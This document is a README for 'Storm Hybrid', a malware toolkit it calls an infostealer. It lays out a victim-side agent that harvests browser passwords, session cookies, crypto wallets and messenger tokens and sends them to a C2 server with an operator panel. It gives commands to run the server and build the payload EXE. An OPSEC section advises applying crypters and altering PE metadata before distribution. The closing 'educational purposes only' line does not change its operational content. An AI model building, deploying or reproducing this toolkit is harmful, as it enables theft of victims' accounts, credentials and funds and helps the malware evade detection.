# Storm Hybrid

Modular infostealer with server-side decryption, session hijacking, and full browser/messenger/wallet data extraction.

## Architecture

```
storm-hybrid/
├── agent/         # Victim-side payload (Python, compiles to EXE via PyInstaller)
│   ├── browser/   # Chromium (Chrome/Edge/Brave/Opera) + Gecko (Firefox/Waterfox)
│   ├── crypto/    # Wallet extraction (MetaMask, Exodus, Electrum, +8 more)
│   ├── messengers/# Discord tokens, Telegram session, Signal config
│   ├── grabber/   # File collector + screenshot capture
│   ├── crypt/     # AES-256-CBC encryption (client-side)
│   └── exfil/     # HTTPS exfiltration via C2 server
├── server/        # C2 server (FastAPI + TLS)
│   ├── panel/     # Operator web panel (live client list, session restore)
│   ├── decryptor  # Server-side AES decryption with per-token key storage
│   ├── receiver   # Data storage (index.json + per-record JSON files)
│   └── session_restore  # SOCKS5 + Google OAuth session restoration
└── builder/       # Config generator + PyInstaller EXE builder
```

## Features

- **Server-side decryption** — encrypt on agent, decrypt on C2 (like Storm)
- **Browser credential harvesting** — Chrome, Edge, Brave, Opera, Vivaldi, Firefox, Waterfox, Pale Moon
- **Session cookie theft** — import cookies to hijack authenticated sessions
- **Crypto wallet extraction** — MetaMask, Exodus, Electrum, Atomic, Coinbase, Binance, Phantom, Keplr, TrustWallet, TronLink
- **Messenger takeover** — Discord tokens, Telegram session (tdata), Signal config
- **File grabber** — documents from Desktop/Documents/Downloads
- **Screenshot capture** — all monitors, configurable delay
- **RAM-only operation** — no disk writes (except encrypted container)
- **Per-token AES keys** — each client has unique encryption key, stored server-side
- **Auto session restore** — SOCKS5 proxy + Google Refresh Token integration

## Quick Start

### Server
```bash
cd server
pip install -r requirements.txt
python gen_cert.py
python -m uvicorn main:app --host 0.0.0.0 --port 8443 --ssl-keyfile server.key --ssl-certfile server.crt
```

### Build Agent
```bash
python builder/builder.py --server https://YOUR_SERVER:8443 --token client-001
python builder/builder.py --server https://YOUR_SERVER:8443 --token client-001 --exe
```

### Panel
Open `https://YOUR_SERVER:8443/panel/`

## API

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/health` | Server status |
| GET | `/api/clients` | List all clients |
| GET | `/api/client/{token}` | Client data |
| POST | `/api/collect` | Data collection endpoint |
| POST | `/api/restore` | Session restoration |
| GET | `/panel/` | Operator web panel |

## OPSEC

- Use your own VPS, never a public C2
- Apply crypter (Scruby, TheProtect) before distribution
- Change PE timestamp and icon via Resource Hacker
- Test on VM before deployment

> Educational purposes only.
